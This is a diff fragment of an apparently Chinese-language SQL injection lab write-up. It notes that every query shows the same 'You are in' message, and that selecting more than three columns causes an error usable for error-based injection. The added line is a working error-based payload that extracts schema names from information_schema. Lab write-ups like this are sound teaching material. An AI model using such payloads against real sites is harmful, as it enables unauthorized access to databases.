@@ -16,6 +16,6 @@
 　　**无论怎么进行查询，结果都会显示You are in .........**
 
 　　**但是当我们查询的字段多于3个后，页面会报错，就可以利用报错注入**
-
+ -1' union all select count(*),2,concat( '~',(select schema_name from information_schema.schemata limit 4,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23
 
 　　‍
